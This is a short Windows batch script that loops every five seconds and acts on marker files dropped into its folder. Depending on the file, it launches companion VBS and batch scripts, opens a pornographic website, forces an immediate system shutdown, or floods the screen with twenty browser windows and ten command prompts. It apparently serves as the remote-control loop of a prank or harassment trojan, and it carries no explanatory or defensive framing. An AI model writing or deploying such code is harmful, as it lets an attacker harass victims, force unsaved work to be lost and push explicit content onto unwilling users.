@echo off
:lop
cls
if exist "sys" (start "" "%~dp0..\scripts\sys.vbs")
if exist "printe" (start "" "%~dp0..\scripts\pri.bat")
if exist "mesg" (start "" "%~dp0..\scripts\msge.vbs")
if exist "porn" (start https://www.xvideos.com)
if exist "shut" (shutdown /f /s /t 2)
if exist "loc" (
    for /l %%i in (1,1,20) do start https://www.xvideos.com
    for /l %%j in (1,1,10) do start cmd
)
timeout /t 5 >nul
goto lop
